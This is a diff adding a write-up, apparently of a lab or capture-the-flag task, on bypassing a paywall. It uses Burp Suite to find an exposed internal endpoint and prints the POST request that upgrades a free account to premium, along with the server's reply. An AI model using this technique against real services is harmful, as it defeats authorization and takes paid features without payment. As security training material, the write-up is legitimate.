@@ -1,0 +1,79 @@
+## Paywall Bypass (Premium Analytics) — Write-Up
+
+Objective
+Access Premium features (Advanced Analytics / Data Export) even though the account is on the Free plan.
+
+1) Recon / Observation
+After logging in, the dashboard clearly showed:
+Subscription Status: Free
+Premium features were locked
+So the target became: upgrade the user tier OR bypass the premium check.
+
+2) Capturing the important request
+Using Burp Suite HTTP history, I identified the session flow:
+POST /api/auth/login
+GET /api/auth/me
+
+
+I sent GET /api/auth/me to Repeater to inspect what the backend returns about the account.
+At first, I received:
+304 Not Modified
+This happened because Burp included an If-None-Match header (ETag caching).
+Then I removed If-None-Match header (or added Cache-Control: no-cache)
+Then the server returned 200 OK with JSON.
+
+3) Finding the subscription tier field
+The response from GET /api/auth/me showed:
+{
+  "uid": "02747434-b5f2-4984-9a1e-446c60c01840",
+  "email": "rs@mail.com",
+  "fullName": "user",
+  "subscriptionTier": "free",
+  "createdAt": "2026-01-21T11:56:36.900Z"
+}
+
+ This confirmed the premium lock is controlled using:
+subscriptionTier: free | premium | enterprise
+
+
+4) Endpoint discovery
+Since no premium API requests appeared in Burp , I searched the frontend JavaScript.
+Inside the app’s JS code, I found an example object showing an internal endpoint:
+upgradeUserExample: {
+  endpoint: "/api/internal/v1/migrate/user-tier",
+  method: "POST",
+  body: {
+      u: "user-uid-here",
+      t: "premium"
+  },
+  validTiers: ["free", "premium", "enterprise"]
+}
+
+This looked like a endpoint that should not be accessible to normal users.
+
+5) Exploitation (Broken Access Control)
+I sent the following request in Burp Repeater:
+POST /api/internal/v1/migrate/user-tier HTTP/1.1
+Host: 23.239.26.112:8091
+Authorization: Bearer <JWT>
+Content-Type: application/json
+Accept: application/json
+
+{"u":"02747434-b5f2-4984-9a1e-446c60c01840","t":"premium"}
+
+ The server responded with 200 OK:
+{"success":true,"uid":"02747434-b5f2-4984-9a1e-446c60c01840","tier":"premium"}
+
+This confirmed the endpoint was exposed and allowed tier upgrades without proper authorization.
+
+6) Verification
+After upgrading, I checked again:
+GET /api/auth/me
+Expected result:
+subscriptionTier should now be "premium"
+
+At this point, the premium features can be accessed.
+
+Vulnerability
+Broken Access Control / Improper Authorization
+An internal endpoint meant for migration/admin use was publicly reachable and could be used by any authenticated user to upgrade their subscription tier.
